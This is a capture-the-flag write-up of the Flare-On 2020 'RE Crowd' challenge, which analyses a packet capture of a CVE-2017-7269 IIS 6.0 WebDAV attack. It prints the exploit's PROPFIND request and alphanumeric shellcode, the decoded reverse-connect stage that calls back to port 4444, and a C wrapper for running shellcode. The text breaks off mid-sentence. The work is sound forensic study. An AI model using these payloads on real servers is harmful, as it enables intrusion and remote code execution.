# Flare-On 2020: RE Crowd

[flare-on](/tags#flare-on ) [ctf](/tags#ctf ) [flare-on-re-crowd](/tags#flare-
on-re-crowd ) [reverse-engineering](/tags#reverse-engineering )
[pcap](/tags#pcap ) [wireshark](/tags#wireshark ) [tshark](/tags#tshark )
[cve-2017-7269](/tags#cve-2017-7269 ) [shellcode](/tags#shellcode )
[scdbg](/tags#scdbg ) [crypto](/tags#crypto ) [python](/tags#python )
[x64dbg](/tags#x64dbg ) [cff-explorer](/tags#cff-explorer )
[cyberchef](/tags#cyberchef ) [procmon](/tags#procmon )  
  
Oct 30, 2020

  * [[1] Fidler](/flare-on-2020/fidler)
  * [[2] garbage](/flare-on-2020/garbage)
  * [[3] wednesday](/flare-on-2020/wednesday)
  * [[4] report.xls](/flare-on-2020/report)
  * [[5] TKApp](/flare-on-2020/tkapp)
  * [[6] CodeIt](/flare-on-2020/codeit)
  * [7] RE Crowd
  * [[8] Aardvark](/flare-on-2020/aardvark)
  * [[9] crackinstaller](/flare-on-2020/crackinstaller)
  * [[10] break](/flare-on-2020/break)

![recrowd](https://0xdfimages.gitlab.io/img/flare2020-recrowd-cover.png)

RE Crowd was a different kind of reversing challenge. I’m given a PCAP that
includes someone trying to exploit an IIS webserver using CVE-2017-7269. This
exploit uses alphanumeric shellcode to run on success. I’ll pull the shellcode
and analyze it, seeing that it’s a Metasploit loader that connects to a host
and then the host sends back an encrypted blob. The host then sends another
encrypted blob back to the attcker. I’ll use what I can learn about the
attacker’s commands to decrypt that exfil and find the flag.

## Challenge

> Hello,
>
> Here at Reynholm Industries we pride ourselves on everything. It’s not easy
> to admit, but recently one of our most valuable servers was breached. We
> don’t believe in host monitoring so all we have is a network packet capture.
> We need you to investigate and determine what data was extracted from the
> server, if any.
>
> Thank you

In a new twist for Flare-On (at least as far as I’ve done), I’m given only a
PCAP file:

    
    
    root@kali# file re_crowd.pcapng 
    re_crowd.pcapng: pcapng capture file - version 1.0
    

## PCAP

### Statistics

When I’m given a PCAP, I like to start by looking at statistics about the
conversations. This can be done in Wireshark, but I’ll go with the command
line.

There are three hosts, with 192.168.68.21 talking to 192.168.68.1 and
192.168.0.1:

    
    
    root@kali# tshark -r re_crowd.pcapng -q -z conv,ip
    ================================================================================
    IPv4 Conversations
    Filter:<No Filter>
                                                   |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |          
                                                   | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |          
    192.168.68.1         <-> 192.168.68.21            419    129550     299     98483     718    228033     5.005510000        20.7639            
    192.168.0.1          <-> 192.168.68.21              2       182       0         0       2       182     0.000000000         5.3247
    ================================================================================ 
    

There are 93 different TCP streams (the numbering is 0-based):

    
    
    root@kali# tshark -r re_crowd.pcapng -T fields -e tcp.stream | sort -unr | head -1
    92
    

Most of the TCP streams are 192.168.68.21 connecting to a webserver on
192.168.68.1:80, but there are two others that stand out:

    
    
    root@kali# tshark -r re_crowd.pcapng -q -z conv,tcp
    ================================================================================
    TCP Conversations
    Filter:<No Filter>
                                                               |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
                                                               | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
    192.168.68.21:34078        <-> 192.168.68.1:80                 14     42894      18      3293      32     46187     5.008275000        20.7612
    192.168.68.21:34082        <-> 192.168.68.1:80                  6     11817       7       826      13     12643    10.327909000        10.2096
    192.168.68.21:44685        <-> 192.168.68.1:80                  5       635       7      2089      12      2724    17.238991000         2.2128
    192.168.68.21:34080        <-> 192.168.68.1:80                  5      7465       6       756      11      8221    10.327019000        10.2104
    192.168.68.21:44241        <-> 192.168.68.1:80                  4       569       6      2137      10      2706    16.647657000         0.0459
    192.168.68.21:46587        <-> 192.168.68.1:80                  4       569       6      2135      10      2704    16.676111000         0.0453
    ...[snip]...
    192.168.68.1:2927          <-> 192.168.68.21:1337               3       182       5       484       8       666    16.829064000         0.0016
    ...[snip]...
    192.168.68.21:4444         <-> 192.168.68.1:2926                3       170       2      1359       5      1529    16.827242000         0.1136
    ...[snip]...
    ================================================================================
    

The two more interesting connections:

  * 192.168.68.21:4444 <–> 192.168.68.1:2926 starting 16.827 seconds into the PCAP, lasting 0.1136 seconds
  * 192.168.68.1:2927 <–> 192.168.68.21:1337 starting 16.829 seconds into the PCAP, lasting 0.453 seconds.

Anytime you see port 1337 (leet) in a CTF, it’s likely interesting. And port
4444 is the default Metasploit port. Given how close together these were in
time, and the successive source ports from the .1, they are likely related.

### Wireshark

#### TCP Streams Overview

Opening the PCAP in Wireshark, I can validate what I saw with `tshark`.
There’s no unimportant data in here. The TCP streams break into six groups:

Stream | Activity  
---|---  
0-2 | A GET request for a internal company chat, with images and CSS  
3-31 | Some kind of FIN/ACK scans from the attacker to the server.  
32-48, 52-92 | Exploit failures, 500 response from server  
49 | Exploit success  
50 | Server connects to attacker on TCP 4444, attacker sends encrypted  
51 | Server connects to attacker on TCP 1337, server sends encrypted  
  
The two encrypted streams will be important later, but not much to do with
them now.

#### Chat

The chat page has a section `topnav` and then a column with chat in it, each
of which looks like:

    
    
    <div class="row">
    	<div class="postdetails">
    		<div class="post top">
    			June, 5th, 2018, 01:33 PM
    		</div>
    		<div class="post left">
    			<p>
    				<img src="jen.jpg" class="avatar">Jen
    			</p>
    		</div>
    		<div class="post right">
    			<p>Roy, Moss, look!! I made an IT Department web forum!!</p>
    		</div>
    	</div>
    </div>
    

I can dump all the HTTP objects out of Wireshark and open it in Firefox:

[
![image-20201029141632297](https://0xdfimages.gitlab.io/img/image-20201029141632297.png)
](https://0xdfimages.gitlab.io/img/image-20201029141632297.png)

[_Click for full
image_](https://0xdfimages.gitlab.io/img/image-20201029141632297.png)

There’s a few hints in here:

  * There’s a list of usernames and passwords at `C:\accounts.txt` on the server (I actually missed this originally, but I’ll show later how I found it).
  * The server isn’t patched at all.
  * The timeframe is June 2018.

#### Exploit

The exploit attempts are each a PROPFIND request to the root with an `IF`
header with a long string:

    
    
    PROPFIND / HTTP/1.1
    Host: 192.168.68.1
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
    Content-Length: 0
    If: <http://192.168.68.1:80/AFRPWWBVQzHpAERtoPGOxDTKYBGmrxqhVCdIGMmNDzefUMySmeCdKhFobQXIDkhgEpnMeUniloxaFrfDCCBprACtWhHkrCVphXAmetqJqxATcnu............................................................................................................................> (Not <locktoken:write1>) <http://192.168.68.1:80/oxamUvbohSEvpUpVuakwGpSnAQoMYMshqrvwwjFDLrhpIfQlgCdAlvwhrhCpWoKXCgOMkAbpjBnwLDdfCGcxCAyShpvGEmVwncZIIFDjgilqkGt.........................................................................................................................................................................................................................................................................VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA>
    

Each of the attempts are the same except they remove the first byte after
`<http://192.168.68.1:80/` in the `If:` header from the prior attempt (so the
`A` in the example above). This looks to me like a buffer overflow where the
attacker is trying to get the right buffer length to line up the rest of the
exploit to run.

In each request except for one (the one that works, where there’s no
response), there’s a 500 response from the server:

    
    
    HTTP/1.1 500 Internal Server Failure
    Connection: close
    Date: Thu, 16 Jul 2020 20:19:53 GMT
    Server: Microsoft-IIS/6.0
    MicrosoftOfficeWebServer: 5.0_Pub
    X-Powered-By: ASP.NET
    Content-Type: text/html
    Content-Length: 67
    
    <body><h1>HTTP/1.1 500 Internal Server Error(exception)</h1></body>
    

Based on the unusual PROPFIND requests and the `Server` header saying the
server runs IIS 6.0, some googling quickly leads to CVE-2017-7269. This [blog
from
TrendMicro](https://www.trendmicro.com/en_us/research/17/c/iis-6-0-vulnerability-
leads-code-execution.html) does a good short overview. There are [POCs
available](https://github.com/edwardz246003/IIS_exploit) on GitHub. [This blog
post](https://javiermunhoz.com/blog/2017/04/17/cve-2017-7269-iis-6.0-webdav-
remote-code-execution.html) does a good deeper dive into the vulnerability.
One takeaway is that the exploit must use alphanumeric shellcode. With that
limited instruction set, typically shellcode will decode itself into something
more complex (outside the alphanumeric limitations) and then run its decoded
version.

I’ll grab the shellcode from the one request with no return from the server
(though each request is the same) and save that:

    
    
    VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA
    

## RE

### Decode Shellcode

I first tried to see if I could just run this shellcode in something like
`scdbg.exe`, but it didn’t work. After a bunch of Googling, it looks like I’m
going to need to decode it first. Luckily, [this
article](https://www.fortinet.com/blog/threat-research/buffer-overflow-attack-
targeting-microsoft-iis-6-0-returns) is all about how to decode shellcode in
just this kind of attack, and it includes a reference to a [script to decode
this encoder](https://raw.githubusercontent.com/axfla/Metasploit-
AlphanumUnicodeMixed-decoder/master/dcode.py).

#### Example from Blog

It took me a little bit of experimentation to get this to work correctly. In
the hexdump images in the post, there’s a bunch of unicode, and then the ASCII
starts with `VVYAIAI...`. In the script the `encoded_bytes` variable is set to
`"\x56\x56\x59\x41\x49\x41\x49...`, which is that string hex encoded.

When I run the script without modification, it prints a bunch of stuff. The
author’s image showing a hexdump of the shellcode starts with the bytes `FC
E8`, which is a common pattern for shellcode. Interestingly, that’s in the
middle of this output.

[![image-20200924185317420](https://0xdfimages.gitlab.io/img/image-20200924185317420.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200924185317420.png)

Not entirely sure, I started the decoded shellcode there through the end of
the line, and used `xxd -r -p` to convert it to binary.

Now, `scdbg.exe` works on the result, matching what was in the blog post:

    
    
    PS > scdbg.exe -f F:\07-re_crowd\example_shellcode.bin
    Loaded 1d3 bytes from file F:\07-re_crowd\example_shellcode.bin
    Initialization Complete..
    Max Steps: 2000000
    Using base offset: 0x401000
    
    4010a4  LoadLibraryA(wininet)
    4010b2  InternetOpenA(wininet)
    4010c8  InternetConnectA(server: 192.144.150.188, port: 80, )
    
    Stepcount 2000001
    

#### re_crowd

I’ll convert the shellcode into hex in Bash:

    
    
    root@kali# cat shellcode.txt | xxd -p | tr -d '\n' | sed 's/.\{2\}/\\x&/g'
    \x56\x56\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39\x75\x34\x4a\x42\x59\x6c\x48\x68\x61\x72\x6d\x30\x69\x70\x49\x70\x53\x30\x75\x39\x69\x55\x4d\x61\x59\x30\x71\x54\x74\x4b\x42\x30\x4e\x50\x52\x6b\x71\x42\x4c\x4c\x42\x6b\x50\x52\x4d\x44\x62\x6b\x73\x42\x6c\x68\x6c\x4f\x77\x47\x4d\x7a\x6d\x56\x4e\x51\x6b\x4f\x54\x6c\x6d\x6c\x51\x51\x71\x6c\x6c\x42\x4c\x6c\x4d\x50\x47\x51\x56\x6f\x5a\x6d\x6a\x61\x46\x67\x58\x62\x49\x62\x72\x32\x4e\x77\x52\x6b\x31\x42\x7a\x70\x44\x4b\x6d\x7a\x4f\x4c\x74\x4b\x50\x4c\x6a\x71\x71\x68\x4a\x43\x61\x38\x7a\x61\x38\x51\x50\x51\x74\x4b\x61\x49\x6d\x50\x49\x71\x67\x63\x74\x4b\x4d\x79\x5a\x78\x6b\x33\x4d\x6a\x6e\x69\x52\x6b\x4d\x64\x64\x4b\x4d\x31\x36\x76\x6e\x51\x59\x6f\x56\x4c\x66\x61\x58\x4f\x6a\x6d\x39\x71\x75\x77\x50\x38\x57\x70\x30\x75\x6c\x36\x4c\x43\x71\x6d\x39\x68\x4f\x4b\x61\x6d\x4e\x44\x43\x45\x47\x74\x6e\x78\x42\x6b\x4f\x68\x4d\x54\x4b\x51\x56\x73\x32\x46\x74\x4b\x4c\x4c\x50\x4b\x64\x4b\x4e\x78\x4b\x6c\x59\x71\x5a\x33\x74\x4b\x4c\x44\x44\x4b\x59\x71\x58\x50\x64\x49\x71\x34\x6e\x44\x6e\x44\x6f\x6b\x71\x4b\x53\x31\x70\x59\x31\x4a\x62\x31\x79\x6f\x4b\x30\x4f\x6f\x31\x4f\x51\x4a\x62\x6b\x5a\x72\x48\x6b\x72\x6d\x61\x4d\x62\x48\x4c\x73\x4c\x72\x59\x70\x6b\x50\x42\x48\x52\x57\x72\x53\x6c\x72\x61\x4f\x31\x44\x53\x38\x6e\x6c\x62\x57\x6d\x56\x6b\x57\x39\x6f\x48\x55\x74\x78\x56\x30\x4d\x31\x49\x70\x79\x70\x4b\x79\x69\x34\x4e\x74\x62\x30\x62\x48\x4e\x49\x75\x30\x30\x6b\x79\x70\x69\x6f\x49\x45\x4e\x70\x4e\x70\x50\x50\x32\x30\x31\x30\x32\x30\x61\x30\x6e\x70\x53\x38\x78\x6a\x4c\x4f\x47\x6f\x67\x70\x49\x6f\x77\x65\x46\x37\x50\x6a\x6b\x55\x53\x38\x55\x70\x77\x38\x31\x34\x6e\x35\x50\x68\x4c\x42\x69\x70\x6a\x71\x71\x4c\x72\x69\x58\x66\x71\x5a\x6c\x50\x72\x36\x62\x37\x70\x68\x33\x69\x74\x65\x61\x64\x71\x51\x4b\x4f\x77\x65\x43\x55\x45\x70\x64\x34\x4a\x6c\x59\x6f\x70\x4e\x39\x78\x62\x55\x48\x6c\x30\x68\x7a\x50\x57\x45\x56\x42\x52\x36\x79\x6f\x66\x75\x30\x6a\x39\x70\x51\x5a\x6b\x54\x71\x46\x52\x37\x6f\x78\x4b\x52\x79\x49\x66\x68\x6f\x6f\x39\x6f\x48\x55\x44\x4b\x70\x36\x33\x51\x5a\x56\x70\x4b\x71\x48\x30\x4f\x6e\x72\x62\x6d\x6c\x4e\x32\x4a\x6d\x70\x6f\x78\x4d\x30\x4e\x30\x79\x70\x4b\x50\x30\x51\x52\x4a\x69\x70\x70\x68\x70\x58\x36\x44\x30\x53\x6b\x35\x69\x6f\x47\x65\x42\x6d\x44\x58\x39\x70\x6b\x51\x39\x70\x4d\x30\x72\x33\x52\x36\x70\x50\x42\x4a\x4b\x50\x30\x56\x62\x33\x42\x37\x33\x38\x4b\x52\x78\x59\x46\x68\x31\x4f\x49\x6f\x48\x55\x39\x71\x55\x73\x4e\x49\x55\x76\x31\x65\x68\x6e\x51\x4b\x71\x49\x6f\x6d\x72\x35\x4f\x67\x34\x49\x59\x4f\x67\x78\x4c\x50\x6b\x50\x4d\x30\x79\x70\x30\x6b\x53\x39\x52\x4c\x70\x6c\x61\x55\x54\x32\x32\x56\x32\x55\x42\x4c\x44\x34\x52\x55\x71\x62\x73\x35\x4c\x71\x4d\x62\x4f\x43\x31\x4e\x70\x31\x67\x50\x64\x6a\x6b\x4e\x55\x70\x42\x55\x39\x6b\x31\x71\x38\x6f\x79\x70\x6d\x31\x39\x70\x4d\x30\x4e\x51\x79\x4b\x39\x72\x6d\x4c\x39\x77\x73\x59\x65\x72\x73\x50\x4b\x32\x4c\x4f\x6a\x62\x6b\x6c\x6d\x46\x34\x4a\x7a\x74\x6b\x57\x44\x46\x6a\x74\x6d\x4f\x62\x68\x4d\x44\x49\x77\x79\x6e\x39\x30\x53\x45\x37\x78\x4d\x61\x37\x6b\x4b\x4e\x37\x50\x59\x72\x6d\x4c\x79\x77\x63\x5a\x4e\x34\x49\x77\x53\x56\x5a\x74\x4d\x4f\x71\x78\x6c\x54\x4c\x47\x49\x72\x6e\x34\x6b\x6f\x31\x7a\x4b\x64\x6e\x37\x50\x30\x42\x35\x49\x70\x70\x45\x6d\x79\x42\x55\x6a\x45\x61\x4f\x55\x73\x41\x41
    

`xxd -p` will convert the ASCII bytes to hex (and in raw format with `-p`).
Then `tr -d '\n' ` will remove the newlines. Finally, `sed 's/.\{2\}/\\x&/g'`
will match on any two characters, and replace them with `\x[same two
characters]` to get the string in the right format.

I’ll replace the shellcode in the script with this output, and Just like
before, the script prints a lot of extra stuff:

    
    
    root@kali# python dcode-mod.py 
    aTjRb\iYaYaYxQjQQaaqYYYYAQRRRRWY`1dP0R
    8u};}$uXX$fI:I41                      Rr(J&1<a|, 
               KXD$$[[aYZQ__Z]h32hws2_ThLw&)TPh)kPPPP@P@PhjhDh\jVWhtat
                                                                      NuhVjjVWh_6KXORj@hQjhXSSVPjVSWh_)u[Y]UWkillervulture123^1u1u10UEIu_Q
    B6D1D1D1D1D1D1D1D1D1D1D1D1D1D1D1F861546A52625C69596159615978516A51D1D1D151D1D1616171C1595959594151D1F1D1E252525252FD575984E2FCE8820000006089E531C0648B50308B520C8B52148B72280FB74A2631FFAC3C617C022C20C1CF0D01C7E2F252578B52108B4A3C8B4C1178E34801D1518B592001D38B4918E33A498B348B01D631FFACC1CF0D01C738E075F6037DF83B7D2475E4588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE05F5F5A8B12EB8D5D6833320000687773325F54684C772607FFD5B89001000029C454506829806B00FFD5505050504050405068EA0FDFE0FFD5976A0568C0A84415680200115C89E66A1056576899A57461FFD585C0740CFF4E0875EC68F0B5A256FFD56A006A0456576802D9C85FFFD58B3681F64B584F528D0E6A406800100000516A006858A453E5FFD58D98000100005356506A005653576802D9C85FFFD501C329C675EE5B595D555789DFE8100000006B696C6C657276756C747572653132335E31C0AAFEC075FB81EF0001000031DB021C0789C280E20F021C168A140786141F881407FEC075E831DBFEC0021C078A140786141F88140702141F8A1417305500454975E55FC351
    

But there’s an `FCE8`, so I’ll start there and grab the rest. Converting it
back to binary with `xxd -r -p`, it now runs in `scdbg.exe`:

    
    
    PS > .\scdbg.exe -f F:\07-re_crowd\flare7decode_mod_raw
    Loaded 18b bytes from file F:\07-re_crowd\flare7decode_mod_raw
    Initialization Complete..
    Max Steps: 2000000
    Using base offset: 0x401000
    
    40109b  LoadLibraryA(ws2_32)
    4010ab  WSAStartup(190)
    4010ba  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
    4010d4  connect(h=42, host: 192.168.68.21 , port: 4444 ) = 71ab4a07
    4010f1  recv(h=42, buf=12fc5c, len=4, fl=0)
            Allocation (e5e5849) > MAX_ALLOC adjusting...
    40110c  VirtualAlloc(base=0 , sz=1000000) = 600000
            len being reset to 4096 from e5e5849
    401121  recv(h=42, buf=600100, len=1000, fl=0)
            len being reset to 4096 from e5e5849
    401121  recv(h=42, buf=600100, len=1000, fl=0)
    
    Stepcount 2000001
    

The shellcode is making a connection to 192.168.68.21:4444, calling `recv`,
allocating space with `VirtualAlloc`, then a couple more `recv`, and it exits.

At this point I can form a theory about what’s happening. The shellcode is
making this connection back to the attacker on .21, and the attacker is
sending more shellcode to be executed. I’m going to guess that the shellcode
in the PCAP starts another connection back to the attacker, this time
encrypting and exfiling data.

### Prep to Run

While `scdbg.exe` is a great tool to get an idea about what shellcode is doing
(and that’s often as deep as people need to go), I want to run this shellcode
and debug it.

#### Network

I want to run this shellcode and be in a position to send the next stage back
to it. To do that, I’ll set up my two VMs by changing their network adapters
to “Internal Network” in VirtualBox and picking a common name. By attaching
them both to the same network, they can communicate with each other through a
virtual switch. It’s like this image, except there’s no VM1 (just VM2 and VM3
that can talk to each other):

![VirtualBox network settings – using the Internal network mode in a
combination with the NAT mode](https://0xdfimages.gitlab.io/img/VirtualBox-
network-settings.png)

There I’ll manually set my Kali VM IP to 192.168.68.21, and my Windows VM to
192.168.68.1.

#### Make an exe

Windows won’t just run shellcode. The easiest way to run shellcode is to
create a wrapper program in C:

    
    
    #include <stdio.h>
    
    unsigned char sc[] = "\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x05\x68\xC0\xA8\x44\x15\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x81\xF6\x4B\x58\x4F\x52\x8D\x0E\x6A\x40\x68\x00\x10\x00\x00\x51\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x8D\x98\x00\x01\x00\x00\x53\x56\x50\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x75\xEE\x5B\x59\x5D\x55\x57\x89\xDF\xE8\x10\x00\x00\x00\x6B\x69\x6C\x6C\x65\x72\x76\x75\x6C\x74\x75\x72\x65\x31\x32\x33\x5E\x31\xC0\xAA\xFE\xC0\x75\xFB\x81\xEF\x00\x01\x00\x00\x31\xDB\x02\x1C\x07\x89\xC2\x80\xE2\x0F\x02\x1C\x16\x8A\x14\x07\x86\x14\x1F\x88\x14\x07\xFE\xC0\x75\xE8\x31\xDB\xFE\xC0\x02\x1C\x07\x8A\x14\x07\x86\x14\x1F\x88\x14\x07\x02\x14\x1F\x8A\x14\x17\x30\x55\x00\x45\x49\x75\xE5\x5F\xC3\x51";
    
    int main(int argc, char **argv) {
        int (*func)() = (int(*)())sc;
        func();
    }
    

I’ll compile this on Linux with `mingw32` (`apt install mingw-64`):

    
    
    root@kali# i686-w64-mingw32-g++ -fno-stack-protector run_shellcode.c -o run_shellcode.exe
    

This program will crash if just run because it will try to execute from the
`.data` section which is marked read only. I can change it on each run in
`x32dbg` by finding it in the Memory Map tab, right clicking on it, and
selecting “Set Page Memory Rights”:

[![image-20200924200119713](https://0xdfimages.gitlab.io/img/image-20200924200119713.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200924200119713.png)

Better yet, I can open the exe in CFF Explorer, and then find the Section
Headers:

[![image-20200924200212237](https://0xdfimages.gitlab.io/img/image-20200924200212237.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200924200212237.png)

The characteristics column is where permissions are defined. The various flags
that are set in that `dword` are defined [here](https://docs.microsoft.com/en-
us/windows/win32/api/winnt/ns-winnt-image_section_header). The most
interesting ones for this conversation are `IMAGE_SCN_MEM_EXECUTE`
(0x20000000), `IMAGE_SCN_MEM_READ`, (0x40000000), and `IMAGE_SCN_MEM_WRITE`
(0x80000000). To enable execution on `.data`, I’ll change the value from
0xC0600040 to 0xE0600040, and then save the executable.

### Debugging

Opening this in x32dbg, there are a few break point before it reaches the
entry point:

[![image-20200924201651210](https://0xdfimages.gitlab.io/img/image-20200924201651210.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200924201651210.png)

Stepping through, there are a couple clear loops where DLL API calls are being
processed, until it eventually reaches 0x40309F, which is a `JMP EAX`:

[![image-20200924210023891](https://0xdfimages.gitlab.io/img/image-20200924210023891.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200924210023891.png)

The argument on the stack is `ws2_32`, which offers API calls around sockets.
I’ll leave a break point here and run til it reaches again. This time it’s
calling `ws2_32.WSAStartup`. Continuing, there’s a call to
`ws2_32.WSASocketA`, and then `ws2_32.connect`. I’ll look at this API call a
bit more in depth. [The docs](https://docs.microsoft.com/en-
us/windows/win32/api/winsock2/nf-winsock2-connect) show it takes a socket, a
`sockaddr` pointer, and an int:

[![image-20200924211859706](https://0xdfimages.gitlab.io/img/image-20200924211859706.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20200924211859706.png)

Looking at the stack, there’s the return address, followed by 0x130 (socket
id), then a pointer, and then 0x10 (the length of the name). Right-clicking on
the address and selecting Follow in Dump jumps to the `sockaddr`:

![image-20200924212418639](https://0xdfimages.gitlab.io/img/image-20200924212418639.png)

[The docs](https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2)
show that a `sockaddr` is:

    
    
    struct sockaddr_in {
            short   sin_family;
            u_short sin_port;
            struct  in_addr sin_addr;
            char    sin_zero[8];
    };
    

Object | Value | Note  
---|---|---  
`short sin_family;` | 0x0002 | `AF_INET` == [TCP](https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html)  
`u_short sin_port;` | 0x5C11 | 4444  
`struct in_addr sin_addr;` | 0xC0A84415 | 192.168.68.21  
  
This is a call to connect to 192.168.68.21:4444.

Continuing on, it errors out with a connection refused:

![image-20200924213319963](https://0xdfimages.gitlab.io/img/image-20200924213319963.png)

### Feed Shellcode

Looking at the PCAP, what gets sent back looks like random encrypted data to
me:

![image-20200924213456791](https://0xdfimages.gitlab.io/img/image-20200924213456791.png)

If that’s true, I could either send some random data back and try to
understand the decryption. Better yet, I can replay this data back to the
shellcode and see if it still works.

I copied this data as a hexdump from Wireshark and used [CyberChef’s From
